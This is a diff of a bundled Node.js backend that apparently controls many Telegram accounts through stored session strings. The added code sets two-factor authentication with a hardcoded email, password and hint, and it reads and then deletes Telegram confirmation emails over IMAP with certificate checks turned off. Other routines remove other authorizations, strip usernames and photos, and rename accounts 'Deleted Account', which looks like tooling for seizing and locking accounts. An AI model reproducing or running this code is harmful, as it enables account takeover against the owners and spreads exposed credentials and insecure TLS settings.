@@ -1762,7 +1762,6 @@ app.post('/getUserConfig', async (req, res) => {
   res.json(upiIds);
 });
 
-
 app.get('/builds', async (req, res) => {
   checkerclass.getinstance();
   const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
@@ -2009,38 +2008,6 @@ app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
   }
 });
 
-app.get('/getuser/:number/:u', async (req, res, next) => {
-  try {
-    const number = req.params?.number;
-    const username = req.params?.u;
-    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
-    const user = await db.getUser({ mobile: number });
-    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
-      console.log("In getuser")
-      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
-      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
-      console.log("Connected");
-      if (cli) {
-        console.log("checking for :", username)
-        const res = await client.getchatId(username)
-        return (res)
-      } else {
-        console.log("Client Does not exist!")
-      }
-    } else {
-      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
-      if (cli) {
-        const res = await client.getchatId(username)
-        return (res)
-      } else {
-        console.log("Client Does not exist!")
-      }
-    }
-  } catch (error) {
-    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error.code)
-  }
-});
-
 app.get('/set2fa/:number', async (req, res, next) => {
   res.send("Setting 2FA");
   next();
@@ -2128,7 +2095,6 @@ app.get('/SetAsBufferClient/:number', async (req, res, next) => {
   }
 });
 
-
 app.get('/updatePrivacy/:number', async (req, res, next) => {
   res.send("Updating Privacy");
   next();
@@ -2192,31 +2158,6 @@ app.get('/UpdateUsername/:number', async (req, res, next) => {
     console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
   }
 });
-
-
-app.get('/UpdatePP/:number', async (req, res, next) => {
-  res.send("Updating profile Pic");
-  next();
-}, async (req, res) => {
-  try {
-    const number = req.params?.number;
-    const db = _dbservice__WEBPACK_IMPORTED_MODULE_4__.ChannelService.getInstance();
-    const user = await db.getUser({ mobile: number });
-    console.log(user);
-    if (!(0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.hasClient)(user.mobile)) {
-      const cli = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.createClient)(user.mobile, user.session);
-      const client = await (0,_telegramManager__WEBPACK_IMPORTED_MODULE_5__.getClient)(user.mobile);
-      if (cli) {
-        await client.updateProfilePic("./qrcode.jpg");
-      } else {
-        console.log("Client Does not exist!")
-      }
-    }
-  } catch (error) {
-    console.log("Some Error: ", (0,_utils__WEBPACK_IMPORTED_MODULE_7__.parseError)(error), error)
-  }
-});
-
 
 app.get('/UpdateName/:number', async (req, res, next) => {
   res.send("Updating Name");
@@ -3233,6 +3174,204 @@ function disconnectfromMail() {
 
 /***/ }),
 
+/***/ "./nest/IMap/IMap.ts":
+/*!***************************!*\
+  !*** ./nest/IMap/IMap.ts ***!
+  \***************************/
+/***/ (function(__unused_webpack_module, exports, __webpack_require__) {
+
+
+var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
+    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
+    return new (P || (P = Promise))(function (resolve, reject) {
+        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
+        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
+        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
+        step((generator = generator.apply(thisArg, _arguments || [])).next());
+    });
+};
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.MailReader = void 0;
+const imap_1 = __importDefault(__webpack_require__(/*! imap */ "imap"));
+class MailReader {
+    constructor() {
+        this.isReady = false;
+        this.result = '';
+        this.imap = new imap_1.default({
+            user: process.env.GMAIL_ADD,
+            password: process.env.GMAIL_PASS,
+            host: 'imap.gmail.com',
+            port: 993,
+            tls: true,
+            tlsOptions: {
+                rejectUnauthorized: false,
+            },
+        });
+        this.imap.once('ready', () => {
+            console.log('Ready');
+            this.isReady = true;
+        });
+        this.imap.once('error', (err) => {
+            console.error('SomeError:', err);
+        });
+        this.imap.once('end', () => {
+            console.log('Connection ended');
+        });
+    }
+    static getInstance() {
+        if (!MailReader.instance) {
+            MailReader.instance = new MailReader();
+        }
+        return MailReader.instance;
+    }
+    connectToMail() {
+        return __awaiter(this, void 0, void 0, function* () {
+            this.result = '';
+            yield new Promise((resolve, reject) => {
+                this.imap.connect((err) => {
+                    if (err) {
+                        reject(err);
+                        return;
+                    }
+                    console.log('Connected to mail server');
+                    resolve();
+                });
+            });
+        });
+    }
+    disconnectFromMail() {
+        return __awaiter(this, void 0, void 0, function* () {
+            this.result = '';
+            yield new Promise((resolve, reject) => {
+                this.imap.end((err) => {
+                    if (err) {
+                        reject(err);
+                        return;
+                    }
+                    console.log('Disconnected from mail server');
+                    resolve();
+                });
+            });
+        });
+    }
+    isMailReady() {
+        return __awaiter(this, void 0, void 0, function* () {
+            return this.isReady;
+        });
+    }
+    getCode() {
+        return __awaiter(this, void 0, void 0, function* () {
+            if (!this.isReady) {
+                throw new Error('Mail reader is not ready. Call connectToMail() first.');
+            }
+            yield this.openInbox();
+            const searchCriteria = [['FROM', 'noreply@telegram.org']];
+            const fetchOptions = {
+                bodies: ['HEADER', 'TEXT'],
+                markSeen: true,
+            };
+            try {
+                const results = yield new Promise((resolve, reject) => {
+                    this.imap.search(searchCriteria, (err, results) => {
+                        if (err) {
+                            reject(err);
+                            return;
+                        }
+                        resolve(results);
+                    });
+                });
+                if (results.length > 0) {
+                    const fetch = this.imap.fetch([results[results.length - 1]], fetchOptions);
+                    yield new Promise((resolve, reject) => {
+                        fetch.on('message', (msg, seqno) => {
+                            const emailData = [];
+                            msg.on('body', (stream, info) => {
+                                let buffer = '';
+                                stream.on('data', (chunk) => {
+                                    buffer += chunk.toString('utf8');
+                                });
+                                stream.on('end', () => {
+                                    if (info.which === 'TEXT') {
+                                        emailData.push(buffer);
+                                    }
+                                    this.imap.seq.addFlags([seqno], '\\Deleted', (err) => {
+                                        if (err) {
+                                            reject(err);
+                                            return;
+                                        }
+                                        this.imap.expunge((err) => {
+                                            if (err) {
+                                                reject(err);
+                                                return;
+                                            }
+                                            console.log(`Deleted message`);
+                                        });
+                                    });
+                                });
+                            });
+                            msg.once('end', () => {
+                                console.log(`Email #${seqno}, Latest ${results[length - 1]}`);
+                                console.log('EmailDataLength:', emailData.length);
+                                console.log('Mail:', emailData[emailData.length - 1].split('.'));
+                                this.result = this.fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);
+                                resolve();
+                            });
+                        });
+                        fetch.once('end', () => {
+                            console.log('Fetched mails');
+                            resolve();
+                        });
+                    });
+                }
+                else {
+                    console.log('No new emails found');
+                }
+            }
+            catch (err) {
+                console.error('Error:', err);
+                throw err; // Re-throw the error for caller to handle
+            }
+            finally {
+                if (this.result.length > 4) {
+                    yield this.disconnectFromMail();
+                }
+            }
+            return this.result;
+        });
+    }
+    openInbox() {
+        return __awaiter(this, void 0, void 0, function* () {
+            yield new Promise((resolve, reject) => {
+                this.imap.openBox('INBOX', false, (err) => {
+                    if (err) {
+                        reject(err);
+                        return;
+                    }
+                    console.log('Inbox opened');
+                    resolve();
+                });
+            });
+        });
+    }
+    fetchNumbersFromString(inputString) {
+        const regex = /\d+/g;
+        const matches = inputString.match(regex);
+        if (matches) {
+            return matches.join('');
+        }
+        else {
+            return '';
+        }
+    }
+}
+exports.MailReader = MailReader;
+
+
+/***/ }),
+
 /***/ "./nest/app.module.ts":
 /*!****************************!*\
   !*** ./nest/app.module.ts ***!
@@ -3324,6 +3463,8 @@ const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
 const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
 const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./nest/components/users/users.service.ts"); // Adjust the import path accordingly
 const TelegramConnectionManager_1 = __importDefault(__webpack_require__(/*! ./TelegramConnectionManager */ "./nest/components/Telegram/TelegramConnectionManager.ts"));
+const utils_1 = __webpack_require__(/*! ../../../utils */ "./utils.js");
+const cloudinary_1 = __webpack_require__(/*! ../../../cloudinary */ "./cloudinary.js");
 let TelegramController = class TelegramController {
     constructor(usersService) {
         this.usersService = usersService;
@@ -3343,12 +3484,6 @@ let TelegramController = class TelegramController {
             return telegramManager.getMessages(username, limit);
         });
     }
-    getDialogs(mobile) {
-        return __awaiter(this, void 0, void 0, function* () {
-            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
-            return yield telegramManager.getDialogs();
-        });
-    }
     getChatId(mobile, username) {
         return __awaiter(this, void 0, void 0, function* () {
             const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
@@ -3358,7 +3493,7 @@ let TelegramController = class TelegramController {
     joinChannels(mobile, channels) {
         return __awaiter(this, void 0, void 0, function* () {
             const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
-            yield telegramManager.joinChannels(channels);
+            telegramManager.joinChannels(channels);
             return 'Channels joined successfully';
         });
     }
@@ -3367,12 +3502,6 @@ let TelegramController = class TelegramController {
             const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
             yield telegramManager.removeOtherAuths();
             return 'Authorizations removed successfully';
-        });
-    }
-    getLastMsgs(mobile, limit) {
-        return __awaiter(this, void 0, void 0, function* () {
-            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
-            return yield telegramManager.getLastMsgs(limit);
         });
     }
     getSelfMsgsInfo(mobile) {
@@ -3393,10 +3522,100 @@ let TelegramController = class TelegramController {
             return yield telegramManager.getAuths();
         });
     }
-    getAllChats(mobile) {
+    set2Fa(mobile) {
         return __awaiter(this, void 0, void 0, function* () {
             const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
-            return yield telegramManager.getAllChats();
+            try {
+                yield telegramManager.set2fa();
+                yield telegramManager.disconnect();
+                return '2Fa set successfully';
+            }
+            catch (error) {
+                const errorDetails = (0, utils_1.parseError)(error);
+                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
+            }
+        });
+    }
+    setProfilePic(mobile, name) {
+        return __awaiter(this, void 0, void 0, function* () {
+            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
+            try {
+                yield cloudinary_1.CloudinaryService.getInstance(name);
+                yield (0, utils_1.sleep)(2000);
+                yield telegramManager.updateProfilePic('./dp1.jpg');
+                yield (0, utils_1.sleep)(1000);
+                yield telegramManager.updateProfilePic('./dp2.jpg');
+                yield (0, utils_1.sleep)(1000);
+                yield telegramManager.updateProfilePic('./dp3.jpg');
+                yield (0, utils_1.sleep)(1000);
+                yield telegramManager.disconnect();
+                return '2Fa set successfully';
+            }
+            catch (error) {
+                const errorDetails = (0, utils_1.parseError)(error);
+                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
+            }
+        });
+    }
+    setAsBufferClient(mobile) {
+        return __awaiter(this, void 0, void 0, function* () {
+            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
+            try {
+                yield telegramManager.set2fa();
+                yield (0, utils_1.sleep)(30000);
+                yield telegramManager.updateUsername('');
+                yield (0, utils_1.sleep)(5000);
+                yield telegramManager.updatePrivacyforDeletedAccount();
+                yield (0, utils_1.sleep)(5000);
+                yield telegramManager.updateProfile("Deleted Account", "Deleted Account");
+                yield (0, utils_1.sleep)(5000);
+                yield telegramManager.deleteProfilePhotos();
+                yield (0, utils_1.sleep)(5000);
+                return "Client set as buffer successfully";
+            }
+            catch (error) {
+                const errorDetails = (0, utils_1.parseError)(error);
+                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
+            }
+        });
+    }
+    updatePrivacy(mobile) {
+        return __awaiter(this, void 0, void 0, function* () {
+            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
+            try {
+                yield telegramManager.updatePrivacy();
+                return "Privacy updated successfully";
+            }
+            catch (error) {
+                const errorDetails = (0, utils_1.parseError)(error);
+                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
+            }
+        });
+    }
+    updateUsername(mobile, username) {
+        return __awaiter(this, void 0, void 0, function* () {
+            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
+            try {
+                yield telegramManager.updateUsername(username);
+                return "Username updated successfully";
+            }
+            catch (error) {
+                console.log("Some Error: ", (0, utils_1.parseError)(error), error);
+                throw new Error("Failed to update username");
+            }
+        });
+    }
+    updateName(mobile, firstName, about) {
+        return __awaiter(this, void 0, void 0, function* () {
+            const telegramManager = yield TelegramConnectionManager_1.default.getInstance(this.usersService).createClient(mobile);
+            try {
+                yield telegramManager.updateProfile(firstName, about);
+                return "Username updated successfully";
+            }
+            catch (error) {
+                console.log("Some Error: ", (0, utils_1.parseError)(error), error);
+                throw new Error("Failed to update username");
+            }
         });
     }
 };
@@ -3427,17 +3646,6 @@ __decorate([
     __metadata("design:paramtypes", [String, String, Number]),
     __metadata("design:returntype", Promise)
 ], TelegramController.prototype, "getMessages", null);
-__decorate([
-    (0, common_1.Get)('dialogs/:mobile'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get all dialogs from Telegram' }),
-    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
-    (0, swagger_1.ApiResponse)({ status: 200, description: 'Dialogs fetched successfully' }),
-    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad request' }),
-    __param(0, (0, common_1.Param)('mobile')),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String]),
-    __metadata("design:returntype", Promise)
-], TelegramController.prototype, "getDialogs", null);
 __decorate([
     (0, common_1.Get)('chatid/:mobile'),
     (0, swagger_1.ApiOperation)({ summary: 'Get chat ID for a username' }),
@@ -3476,19 +3684,6 @@ __decorate([
     __metadata("design:returntype", Promise)
 ], TelegramController.prototype, "removeOtherAuths", null);
 __decorate([
-    (0, common_1.Get)('lastmsgs/:mobile'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get the last messages from a specific chat' }),
-    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
-    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Limit the number of messages', required: true }),
-    (0, swagger_1.ApiResponse)({ status: 200, description: 'Messages fetched successfully' }),
-    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad request' }),
-    __param(0, (0, common_1.Param)('mobile')),
-    __param(1, (0, common_1.Query)('limit')),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String, Number]),
-    __metadata("design:returntype", Promise)
-], TelegramController.prototype, "getLastMsgs", null);
-__decorate([
     (0, common_1.Get)('selfmsgsinfo/:mobile'),
     (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
     (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
@@ -3524,16 +3719,69 @@ __decorate([
     __metadata("design:returntype", Promise)
 ], TelegramController.prototype, "getAuths", null);
 __decorate([
-    (0, common_1.Get)('allchats/:mobile'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get all chats' }),
+    (0, common_1.Get)('set2Fa/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Set 2Fa' }),
     (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
-    (0, swagger_1.ApiResponse)({ status: 200, description: 'All chats fetched successfully' }),
+    (0, swagger_1.ApiResponse)({ status: 200, description: '2Fa set successfully' }),
     (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad request' }),
     __param(0, (0, common_1.Param)('mobile')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
     __metadata("design:returntype", Promise)
-], TelegramController.prototype, "getAllChats", null);
+], TelegramController.prototype, "set2Fa", null);
+__decorate([
+    (0, common_1.Get)('setprofilepic/:mobile/:name'),
+    (0, swagger_1.ApiOperation)({ summary: 'Set Profile Picture' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
+    (0, swagger_1.ApiParam)({ name: 'name', description: 'Profile name', type: String }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __param(1, (0, common_1.Param)('name')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String, String]),
+    __metadata("design:returntype", Promise)
+], TelegramController.prototype, "setProfilePic", null);
+__decorate([
+    (0, common_1.Get)('SetAsBufferClient/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String]),
+    __metadata("design:returntype", Promise)
+], TelegramController.prototype, "setAsBufferClient", null);
+__decorate([
+    (0, common_1.Get)('updatePrivacy/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Update Privacy Settings' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String]),
+    __metadata("design:returntype", Promise)
+], TelegramController.prototype, "updatePrivacy", null);
+__decorate([
+    (0, common_1.Get)('UpdateUsername/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Update Username' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
+    (0, swagger_1.ApiQuery)({ name: 'username', description: 'New username', type: String }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __param(1, (0, common_1.Query)('username')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String, String]),
+    __metadata("design:returntype", Promise)
+], TelegramController.prototype, "updateUsername", null);
+__decorate([
+    (0, common_1.Get)('UpdateName/:mobile'),
+    (0, swagger_1.ApiOperation)({ summary: 'Update Name' }),
+    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
+    (0, swagger_1.ApiQuery)({ name: 'firstName', description: 'First Name', type: String }),
+    (0, swagger_1.ApiQuery)({ name: 'about', description: 'About', type: String }),
+    __param(0, (0, common_1.Param)('mobile')),
+    __param(1, (0, common_1.Query)('firstName')),
+    __param(2, (0, common_1.Query)('about')),
+    __metadata("design:type", Function),
+    __metadata("design:paramtypes", [String, String, String]),
+    __metadata("design:returntype", Promise)
+], TelegramController.prototype, "updateName", null);
 exports.TelegramController = TelegramController = __decorate([
     (0, common_1.Controller)('telegram'),
     (0, swagger_1.ApiTags)('Telegram'),
@@ -3630,7 +3878,9 @@ const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose
 const activechannels_service_1 = __webpack_require__(/*! ../activechannels/activechannels.service */ "./nest/components/activechannels/activechannels.service.ts");
 const active_channel_schema_1 = __webpack_require__(/*! ../activechannels/schemas/active-channel.schema */ "./nest/components/activechannels/schemas/active-channel.schema.ts");
 const utils_1 = __webpack_require__(/*! ../../../utils */ "./utils.js");
+const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
 const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
+const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./nest/IMap/IMap.ts");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         console.log(sessionString);
@@ -3653,9 +3903,8 @@ class TelegramManager {
         return __awaiter(this, void 0, void 0, function* () {
             if (!this.client)
                 throw new Error('Client is not initialized');
-            const tt = yield this.client.getInputEntity(username);
-            console.log(tt);
-            return tt;
+            const entity = yield this.client.getInputEntity(username);
+            return entity;
         });
     }
     createClient() {
@@ -3899,6 +4148,152 @@ class TelegramManager {
             }
         });
     }
+    updatePrivacyforDeletedAccount() {
+        return __awaiter(this, void 0, void 0, function* () {
+            try {
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueDisallowAll()
+                    ],
+                }));
+                console.log("Calls Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueAllowAll()
+                    ],
+                }));
+                console.log("PP Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueDisallowAll()
+                    ],
+                }));
+                console.log("Number Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueDisallowAll()
+                    ],
+                }));
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyAbout(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueAllowAll()
+                    ],
+                }));
+                console.log("LAstSeen Updated");
+            }
+            catch (e) {
+                throw e;
+            }
+        });
+    }
+    updateProfile(firstName, about) {
+        return __awaiter(this, void 0, void 0, function* () {
+            try {
+                const result = yield this.client.invoke(new tl_1.Api.account.UpdateProfile({
+                    firstName: firstName,
+                    lastName: "",
+                    about: about,
+                }));
+                console.log("Updated NAme: ", firstName);
+            }
+            catch (error) {
+                throw error;
+            }
+        });
+    }
+    updateUsername(baseUsername) {
+        return __awaiter(this, void 0, void 0, function* () {
+            let newUserName = '';
+            let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
+            let increment = 0;
+            if (username === '') {
+                try {
+                    const res = yield this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
+                    console.log(`Removed Username successfully.`);
+                }
+                catch (error) {
+                    throw error;
+                }
+            }
+            else {
+                while (true) {
+                    try {
+                        const result = yield this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
+                        console.log(result, " - ", username);
+                        if (result) {
+                            const res = yield this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
+                            console.log(`Username '${username}' updated successfully.`);
+                            newUserName = username;
+                            break;
+                        }
+                        else {
+                            username = baseUsername + increment;
+                            increment++;
+                            yield (0, Helpers_1.sleep)(4000);
+                        }
+                    }
+                    catch (error) {
+                        console.log(error.message);
+                        if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
+                            newUserName = username;
+                            break;
+                        }
+                        username = baseUsername + increment;
+                        increment++;
+                    }
+                }
+            }
+            return newUserName;
+        });
+    }
+    updatePrivacy() {
+        return __awaiter(this, void 0, void 0, function* () {
+            try {
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueDisallowAll()
+                    ],
+                }));
+                console.log("Calls Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueAllowAll()
+                    ],
+                }));
+                console.log("PP Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueDisallowAll()
+                    ],
+                }));
+                console.log("Number Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueAllowAll()
+                    ],
+                }));
+                console.log("LAstSeen Updated");
+                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: new tl_1.Api.InputPrivacyKeyAbout(),
+                    rules: [
+                        new tl_1.Api.InputPrivacyValueAllowAll()
+                    ],
+                }));
+            }
+            catch (e) {
+                throw e;
+            }
+        });
+    }
     getFileUrl(url, filename) {
         return __awaiter(this, void 0, void 0, function* () {
             const response = yield axios_1.default.get(url, { responseType: 'stream' });
@@ -3910,6 +4305,68 @@ class TelegramManager {
                 writer.on('error', reject);
             });
             return filePath;
+        });
+    }
+    updateProfilePic(image) {
+        return __awaiter(this, void 0, void 0, function* () {
+            try {
+                const file = yield this.client.uploadFile({
+                    file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
+                    workers: 1,
+                });
+                console.log("file uploaded- ", file);
+                yield this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
+                    file: file,
+                }));
+                console.log("profile pic updated");
+            }
+            catch (error) {
+                throw error;
+            }
+        });
+    }
+    set2fa() {
+        return __awaiter(this, void 0, void 0, function* () {
+            const imapService = IMap_1.MailReader.getInstance();
+            imapService.connectToMail();
+            const intervalParentId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
+                const isReady = imapService.isMailReady();
+                if (isReady) {
+                    clearInterval(intervalParentId);
+                    yield this.client.updateTwoFaSettings({
+                        isCheckPassword: false,
+                        email: "storeslaksmi@gmail.com",
+                        hint: "password - India143",
+                        newPassword: "Ajtdmwajt1@",
+                        emailCodeCallback: (length) => __awaiter(this, void 0, void 0, function* () {
+                            console.log("code sent");
+                            return new Promise((resolve) => __awaiter(this, void 0, void 0, function* () {
+                                let retry = 0;
+                                const intervalId = setInterval(() => __awaiter(this, void 0, void 0, function* () {
+                                    console.log("checking code");
+                                    retry++;
+                                    const isReady = imapService.isMailReady();
+                                    if (isReady && retry < 4) {
+                                        const code = yield imapService.getCode();
+                                        if (code !== '') {
+                                            clearInterval(intervalId);
+                                            imapService.disconnectFromMail();
+                                            resolve(code);
+                                        }
+                                    }
+                                    else {
+                                        clearInterval(intervalId);
+                                        yield this.client.disconnect();
+                                        imapService.disconnectFromMail();
+                                        resolve(undefined);
+                                    }
+                                }), 6000);
+                            }));
+                        }),
+                        onEmailCodeError: (e) => { console.log((0, utils_1.parseError)(e)); return Promise.resolve("error"); }
+                    });
+                }
+            }), 5000);
         });
     }
     sendPhotoChat(id, url, caption, filename) {
@@ -3928,6 +4385,26 @@ class TelegramManager {
             const filePath = yield this.getFileUrl(url, filename);
             const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
             yield this.client.sendFile(id, { file, caption });
+        });
+    }
+    deleteProfilePhotos() {
+        return __awaiter(this, void 0, void 0, function* () {
+            var _a;
+            try {
+                const result = yield this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
+                    userId: "me"
+                }));
+                console.log(result);
+                if (result && ((_a = result.photos) === null || _a === void 0 ? void 0 : _a.length) > 0) {
+                    const res = yield this.client.invoke(new tl_1.Api.photos.DeletePhotos({
+                        id: result.photos
+                    }));
+                }
+                console.log("Deleted profile Photos");
+            }
+            catch (error) {
+                throw error;
+            }
         });
     }
 }
@@ -6839,6 +7316,16 @@ module.exports = require("node-schedule-tz");
 /***/ ((module) => {
 
 module.exports = require("telegram");
+
+/***/ }),
+
+/***/ "telegram/Helpers":
+/*!***********************************!*\
+  !*** external "telegram/Helpers" ***!
+  \***********************************/
+/***/ ((module) => {
+
+module.exports = require("telegram/Helpers");
 
 /***/ }),
 
